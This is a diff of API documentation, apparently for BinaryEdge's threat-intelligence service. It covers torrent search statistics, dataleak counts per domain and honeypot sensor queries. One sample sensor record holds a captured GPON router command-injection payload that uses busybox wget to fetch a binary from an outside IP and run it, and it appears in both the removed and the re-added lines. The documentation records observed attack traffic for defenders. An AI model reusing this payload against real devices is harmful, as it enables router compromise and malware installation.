+        "port":24279
+      },
+      "torrent":{
+        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
+        "name":"Britain's Best Back Gardens Series",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"TV shows"
+      }
+    }
+  ]
+}
+```
+
+#### /v2/query/torrent/search/stats
+
+Statistics of events for the given query. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
+* type: [String] Type of statistic we want to obtain. Possible types include:
+    * _ports_, _countries_, _asn_, _ips_, _rdns_, _categories_, _names_.
+* days: [Integer] Number of days to get the stats for. For example days=1 for the last day of data.
+    * Max: 90 (default)
+* order: [String] Whether to sort descendently or ascendently to get the top.
+    * _desc_, _asc_
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v2/query/torrent/search/stats?query=category:video&type=ports' -H 'X-Key:API_KEY'
+```
+
+```json
+[
+  {
+    "key":1,
+    "doc_count":168056
+  },
+  {
+    "key":8999,
+    "doc_count":133738
+  },
+  {
+    "key":6881,
+    "doc_count":91512
+  },
+  {
+    "key":51413,
+    "doc_count":58998
+  },
+  {
+    "key":1200,
+    "doc_count":35127
+  }
+]
 ```
 
 ### Dataleaks
@@ -616,11 +823,11 @@ curl 'https://api.binaryedge.io/v2/query/dataleaks/email/user@example.com' -H 'X
 
 #### /v2/query/dataleaks/organization/{domain}
 
+**Note**: Available for paid subscriptions only.
+
 Verify how many emails are affected by dataleaks for a specific domain. We don't provide the list of affected emails.
 
 For example, searching for the domain 'example.com' returns {"leak":"linkedin", "count":805}, this means there are 805 accounts with an example.com email on the Linkedin dump.
-
-**Note**: Available for paid subscriptions only.
 
 *Parameters*
 
@@ -634,81 +841,81 @@ curl 'https://api.binaryedge.io/v2/query/dataleaks/organization/example.com' -H 
 
 ```json
 {
-   "total":192656,
-   "groups":[
-      {"leak":"antipublic", "count":44489},
-      {"leak":"exploitin", "count":19995},
-      {"leak":"badoo", "count":13028},
-      {"leak":"myspace", "count":26266}, 
-      {"leak":"vk", "count":2132},
-      {"leak":"imesh", "count":7549},
-      {"leak":"breachcompilation", "count":58833},
-      {"leak":"mate1", "count":2923},
-      {"leak":"webhost", "count":152},
-      {"leak":"fling", "count":3058},
-      {"leak":"adobe", "count":734},
-      {"leak":"dropbox", "count":1832},
-      {"leak":"zoosk", "count":2506},
-      {"leak":"pastebin", "count":2417},
-      {"leak":"ashleymadison", "count":963},
-      {"leak":"neopets", "count":1772},
-      {"leak":"tumblr", "count":789},
-      {"leak":"taobao", "count":98},
-      {"leak":"xat", "count":774},
-      {"leak":"linkedin", "count":805},
-      {"leak":"tianya", "count":171},
-      {"leak":"youporn", "count":107},
-      {"leak":"leet", "count":84},
-      {"leak":"lastfm", "count":413},
-      {"leak":"modernbusinesssolutions", "count":134},
-      {"leak":"7k7k", "count":84},
-      {"leak":"myrepospace", "count":11},
-      {"leak":"mpgh", "count":62},
-      {"leak":"r2games", "count":64},
-      {"leak":"patreon", "count":17},
-      {"leak":"twitter", "count":66},
-      {"leak":"yahoo", "count":2},
-      {"leak":"nihonomaru", "count":34},
-      {"leak":"gawker", "count":26},
-      {"leak":"nulled", "count":10},
-      {"leak":"habbo", "count":31},
-      {"leak":"abusewithus", "count":23},
-      {"leak":"rsboards", "count":14},
-      {"leak":"cannabis", "count":25},
-      {"leak":"torrentinvites", "count":15},
-      {"leak":"dlh", "count":11},
-      {"leak":"utorrent", "count":8},
-      {"leak":"nextgenupdate", "count":30},
-      {"leak":"xsplit", "count":26},
-      {"leak":"clixsense", "count":9},
-      {"leak":"brazzers", "count":5},
-      {"leak":"adultfriendfinder", "count":10},
-      {"leak":"majorgeeks", "count":4},
-      {"leak":"plex", "count":1},
-      {"leak":"thebot", "count":4},
-      {"leak":"acne", "count":4},
-      {"leak":"cheapassgamer", "count":2},
-      {"leak":"ps3hax", "count":6},
-      {"leak":"vbulletin", "count":5},
-      {"leak":"gta", "count":1},
-      {"leak":"latimes", "count":1},
-      {"leak":"loungeboard", "count":1},
-      {"leak":"crackingforum", "count":3},
-      {"leak":"experian", "count":1},
-      {"leak":"androidforums", "count":1},
-      {"leak":"abandonia", "count":1},
-      {"leak":"minefield", "count":1},
-      {"leak":"delicioustakoyaki", "count":3},
-      {"leak":"hawkingtech", "count":1},
-      {"leak":"newseasims", "count":1},
-      {"leak":"blackhatworld", "count":3},
-      {"leak":"win7vista", "count":1},
-      {"leak":"sexavet", "count":1},
-      {"leak":"muslimmatch", "count":1},
-      {"leak":"forbes", "count":1},
-      {"leak":"sktorrent", "count":1}
-   ],
-   "query":"example.com"
+  "total":192656,
+  "groups":[
+    {"leak":"antipublic", "count":44489},
+    {"leak":"exploitin", "count":19995},
+    {"leak":"badoo", "count":13028},
+    {"leak":"myspace", "count":26266}, 
+    {"leak":"vk", "count":2132},
+    {"leak":"imesh", "count":7549},
+    {"leak":"breachcompilation", "count":58833},
+    {"leak":"mate1", "count":2923},
+    {"leak":"webhost", "count":152},
+    {"leak":"fling", "count":3058},
+    {"leak":"adobe", "count":734},
+    {"leak":"dropbox", "count":1832},
+    {"leak":"zoosk", "count":2506},
+    {"leak":"pastebin", "count":2417},
+    {"leak":"ashleymadison", "count":963},
+    {"leak":"neopets", "count":1772},
+    {"leak":"tumblr", "count":789},
+    {"leak":"taobao", "count":98},
+    {"leak":"xat", "count":774},
+    {"leak":"linkedin", "count":805},
+    {"leak":"tianya", "count":171},
+    {"leak":"youporn", "count":107},
+    {"leak":"leet", "count":84},
+    {"leak":"lastfm", "count":413},
+    {"leak":"modernbusinesssolutions", "count":134},
+    {"leak":"7k7k", "count":84},
+    {"leak":"myrepospace", "count":11},
+    {"leak":"mpgh", "count":62},
+    {"leak":"r2games", "count":64},
+    {"leak":"patreon", "count":17},
+    {"leak":"twitter", "count":66},
+    {"leak":"yahoo", "count":2},
+    {"leak":"nihonomaru", "count":34},
+    {"leak":"gawker", "count":26},
+    {"leak":"nulled", "count":10},
+    {"leak":"habbo", "count":31},
+    {"leak":"abusewithus", "count":23},
+    {"leak":"rsboards", "count":14},
+    {"leak":"cannabis", "count":25},
+    {"leak":"torrentinvites", "count":15},
+    {"leak":"dlh", "count":11},
+    {"leak":"utorrent", "count":8},
+    {"leak":"nextgenupdate", "count":30},
+    {"leak":"xsplit", "count":26},
+    {"leak":"clixsense", "count":9},
+    {"leak":"brazzers", "count":5},
+    {"leak":"adultfriendfinder", "count":10},
+    {"leak":"majorgeeks", "count":4},
+    {"leak":"plex", "count":1},
+    {"leak":"thebot", "count":4},
+    {"leak":"acne", "count":4},
+    {"leak":"cheapassgamer", "count":2},
+    {"leak":"ps3hax", "count":6},
+    {"leak":"vbulletin", "count":5},
+    {"leak":"gta", "count":1},
+    {"leak":"latimes", "count":1},
+    {"leak":"loungeboard", "count":1},
+    {"leak":"crackingforum", "count":3},
+    {"leak":"experian", "count":1},
+    {"leak":"androidforums", "count":1},
+    {"leak":"abandonia", "count":1},
+    {"leak":"minefield", "count":1},
+    {"leak":"delicioustakoyaki", "count":3},
+    {"leak":"hawkingtech", "count":1},
+    {"leak":"newseasims", "count":1},
+    {"leak":"blackhatworld", "count":3},
+    {"leak":"win7vista", "count":1},
+    {"leak":"sexavet", "count":1},
+    {"leak":"muslimmatch", "count":1},
+    {"leak":"forbes", "count":1},
+    {"leak":"sktorrent", "count":1}
+  ],
+  "query":"example.com"
 }
 ```
 
@@ -753,8 +960,7 @@ curl 'https://api.binaryedge.io/v2/query/dataleaks/info' -H 'X-Key:API_KEY'
     "year": "2014",
     "name": "yandex",
     "fullname": "Yandex"
-  },
-    ...
+  }
 }
 ```
 
@@ -1866,15 +2072,15 @@ curl 'https://api.binaryedge.io/v2/query/domains/search?query=A:127.0.0.1' -H 'X
     "domain": "vit.press",
     "root": "vit.press",
     "MX": ["mail.vit.press"]
-  },
-  (...)
-  ]
+  }]
 }
 ```
 
 ### Sensors
 
 #### /v2/query/sensors/ip/{target}
+
+**Note**: Available for paid subscriptions only.
 
 Details about an Scanner. List of recent events form the specified host, including details of scanned ports, payloads and tags.
 
@@ -1892,53 +2098,57 @@ curl 'https://api.binaryedge.io/v2/query/sensors/ip/xxx.xxx.xxx.xxx' -H 'X-Key:A
 
 ```json
 {
-    "query": "xxx.xxx.xxx.xxx",
-    "total": 1,
-    "targets_found": 1,
-    "events": [{
+  "query": "xxx.xxx.xxx.xxx",
+  "total": 1,
+  "targets_found": 1,
+  "events": [{
+    "port": 443,
+    "results": [{
+      "target": {
         "port": 443,
-        "results": [{
-            "target": {
-                "port": 443,
-                "protocol": "tcp"
-            },
-            "origin": {
-                "ts": 1549500839739,
-                "type": "sinkhole",
-                "ip": "xxx.xxx.xxx.xxx",
-                "rdns": "xxx.xxx.xxx.example.com"
-            },
-            "data": {
-                "payload": "POST /GponForm/diag_Form?style/ HTTP/1.1\\r\\nUser-Agent: Hello, World\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0",
-                "extra": {
-                    "http": {
-                        "method": "POST",
-                        "path": "/GponForm/diag_Form?style/",
-                        "version": "1.1",
-                        "headers": {
-                            "user-agent": "Hello, World",
-                            "accept": "*/*",
-                            "accept-encoding": "gzip, deflate",
-                            "content-type": "application/x-www-form-urlencoded"
-                        }
-                    }
-                },
-                "tags": ["HTTP_SCANNER"]
-            },
-            "@timestamp": "2019-02-07T00:54:00.422Z"
-        }]
+        "protocol": "tcp"
+      },
+      "origin": {
+        "ts": 1549500839739,
+        "type": "sinkhole",
+        "ip": "xxx.xxx.xxx.xxx",
+        "rdns": "xxx.xxx.xxx.example.com"
+      },
+      "data": {
+        "payload": "POST /GponForm/diag_Form?style/ HTTP/1.1\\r\\nUser-Agent: Hello, World\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0",
+        "extra": {
+          "http": {
+            "method": "POST",
+            "path": "/GponForm/diag_Form?style/",
+            "version": "1.1",
+            "headers": {
+              "user-agent": "Hello, World",
+              "accept": "*/*",
+              "accept-encoding": "gzip, deflate",
+              "content-type": "application/x-www-form-urlencoded"
+            }
+          }
+        },
+        "tags": ["HTTP_SCANNER"]
+      }
     }]
+  }]
 }
 ```
 
 #### /v2/query/sensors/search
+
+**Note**: Available for paid subscriptions only.
 
 Events based on a Query. List of recent events for the given query, including details of scanned ports, payloads and tags. Can be used with specific parameters and/or full-text search.
 
 *Parameters*
 
 * query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
+* days: [Integer] Number of days to get the stats for. For example days=1 for the last day of data.
+    * Max: 60 (default)
 * page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+* only_ips: [Int] Optional. If selected, only output origin IP addresses, target ports and protocols.
 
 *Output*
 
@@ -1948,54 +2158,52 @@ curl 'https://api.binaryedge.io/v2/query/sensors/search?query=tags:ssh_scanner' 
 
 ```json
 {
-    "query": "tags:ssh_scanner",
-    "page": 1,
-    "pagesize": 20,
-    "total": 1117979,
-    "events": [{
-        "data": {
-            "payload": "SSH-2.0-PUTTY\\r\\n",
-            "extra": {
-                "ssh": {
-                    "description": "SSH-2.0-PUTTY"
-                }
-            },
-            "tags": ["SSH_SCANNER"]
-        },
-        "target": {
-            "port": 22,
-            "protocol": "tcp"
-        },
-        "origin": {
-            "ip": "218.92.1.153",
-            "type": "sinkhole",
-            "ts": 1549625590653,
-            "asn": 4134
+  "query": "tags:ssh_scanner",
+  "page": 1,
+  "pagesize": 20,
+  "total": 1117979,
+  "events": [{
+    "data": {
+      "payload": "SSH-2.0-PUTTY\\r\\n",
+      "extra": {
+        "ssh": {
+          "description": "SSH-2.0-PUTTY"
         }
-    }, {
-        "target": {
-            "port": 22,
-            "protocol": "tcp"
-        },
-        "data": {
-            "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
-            "extra": {
-                "ssh": {
-                    "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
-                    "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
-                }
-            },
-            "tags": ["SSH_SCANNER"]
-        },
-        "origin": {
-            "ip": "58.242.83.31",
-            "type": "sinkhole",
-            "ts": 1549625585310,
-            "asn": 4837
-        }
+      },
+      "tags": ["SSH_SCANNER"]
     },
-    {...}
-    ]
+    "target": {
+      "port": 22,
+      "protocol": "tcp"
+    },
+    "origin": {
+      "ip": "218.92.1.153",
+      "type": "sinkhole",
+      "ts": 1549625590653,
+      "asn": 4134
+    }
+  }, {
+    "target": {
+      "port": 22,
+      "protocol": "tcp"
+    },
+    "data": {
+      "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
+      "extra": {
+        "ssh": {
+          "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
+          "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
+        }
+      },
+      "tags": ["SSH_SCANNER"]
+    },
+    "origin": {
+      "ip": "58.242.83.31",
+      "type": "sinkhole",
+      "ts": 1549625585310,
+      "asn": 4837
+    }
+  }]
 }
 ```
 
@@ -2007,9 +2215,11 @@ Statistics of events for the given query. Can be used with specific parameters a
 
 * query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
 * type: [String] Type of statistic we want to obtain. Possible types include:
-    * _ports_, _tags_, _countries_, _asn_, _ips_, _payloads_, _http\_path_.
+    * _ports_, _tags_, _countries_, _asn_, _ips_, _payloads_, _http\_path_, _rdns_.
 * days: [Integer] Number of days to get the stats for. For example days=1 for the last day of data.
     * Max: 60 (default)
+* order: [String] Whether to sort descendently or ascendently to get the top.
+    * _desc_, _asc_
 
 *Output*
 
@@ -2018,20 +2228,48 @@ curl 'https://api.binaryedge.io/v2/query/sensors/search/stats?query=tags:ssh_sca
 ```
 
 ```json
-[{
+[
+  {
     "key": "22/tcp",
     "doc_count": 1102752
-}, {
+  },
+  {
     "key": "2222/tcp",
     "doc_count": 8149
-}, {
+  },
+  {
     "key": "222/tcp",
     "doc_count": 1970
-}, {
+  },
+  {
     "key": "4000/tcp",
     "doc_count": 1962
-}, {
+  },
+  {
     "key": "23/tcp",
     "doc_count": 1552
-}]
+  }
+]
+```
+
+#### /v2/query/sensors/tag/<tag>
+
+Get a list of IPs that have been associated with a specific TAG. See [List of Tags](sensors-tags.md)
+
+*Parameters*
+
+* tag: [String] Tag you want to get the list of IPs related to.
+    * example: MALICIOUS
+* days: [Integer] Query Param: Number of days to get the stats for. For example days=1 for the last day of data.
+    * Default: 1
+    * Max: 60
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v2/query/sensors/tag/MALICIOUS' -H 'X-Key:API_KEY'
+```
+
+```json
+["1.34.221.87", "1.160.38.189", "1.160.39.129", "1.160.91.241", "1.160.130.56", "1.160.160.98", "1.161.118.167"]
 ```
